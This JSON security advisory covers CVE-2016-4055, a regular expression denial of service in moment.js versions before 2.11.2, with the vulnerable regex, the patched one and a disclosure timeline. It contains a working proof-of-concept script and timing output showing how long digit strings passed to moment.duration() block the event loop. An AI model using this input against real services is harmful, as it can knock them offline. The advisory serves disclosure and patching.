{
  "id": 55,
  "created_at": "2015-10-26",
  "updated_at": "2016-04-21",
  "title": "Regular Expression Denial of Service",
  "author": {
    "name": "Adam Baldwin",
    "website": null,
    "username": null
  },
  "module_name": "moment",
  "publish_date": "2016-01-26",
  "cves": [
    "CVE-2016-4055"
  ],
  "vulnerable_versions": "<2.11.2",
  "patched_versions": ">=2.11.2",
  "overview": "moment is vulnerable to regular expression denial of service when user input is passed unchecked into moment.duration() blocking the event loop for a period of time.\n\n\"The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\" [1]\n\nIt's not a huge amplification it takes about 25k characters to get 1.1 seconds however that's well under most servers max request size so it's certainly exploitable.\n\nThe regular expression in question \n\nmoment/2.10.6/moment.js\n```\n1679     var aspNetRegex = /(\\-)?(?:(\\d*)\\.)?(\\d+)\\:(\\d+)(?:\\:(\\d+)\\.?(\\d{3})?)?/;\n```\n\n\n### Proof of concept\n```\nvar moment = require('moment');\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=20000;i<=10000000;i=i+10000) {\n    console.log(\"COUNT: \" + i);\n    var str = '-' + genstr(i, '1')\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    moment.duration(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\n```\n$ node moment.js\nCOUNT: 20000\nLENGTH: 20002\n[ 0, 618931029 ]\nCOUNT: 30001\nLENGTH: 30003\n[ 1, 401413894 ]\nCOUNT: 40002\nLENGTH: 40004\n[ 2, 437075303 ]\nCOUNT: 50003\nLENGTH: 50005\n[ 3, 824664804 ]\nCOUNT: 60004\nLENGTH: 60006\n[ 5, 651335262 ]\n```\n\n### Timeline:\n- 10/26/2015 - Initial Discovery\n- 10/26/2015 - Maintainers notified via email\n- 12/16/2015 - Maintainers notified via email again\n- 2/2/2016 - Added information to fix from pull request\n- 2/3/2016 - ",
  "recommendation": "Please update to version 2.11.2 or greater. If you are unable to update more information is available below.\n\n\nA fix [has been made available in a pull request](https://github.com/moment/moment/pull/2939). Do not allow untrusted user input into `moment.duration()` or truncate the length of the allowed input to reduce blocking potential.\n\nin moment.js change line 1819 from\n\n`var aspNetRegex = /(\\-)?(?:(\\d*)[. ])?(\\d+)\\:(\\d+)(?:\\:(\\d+)\\.?(\\d{3})?)?/;` \n\nto\n \n`var aspNetRegex = /^(\\-)?(?:(\\d*)[. ])?(\\d+)\\:(\\d+)(?:\\:(\\d+)\\.?(\\d{3})?(?:\\d*)?)?$/;`",
  "references": [
    "https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"
  ],
  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
  "cvss_score": 5.3,
  "coordinating_vendor": "^Lift Security"
}
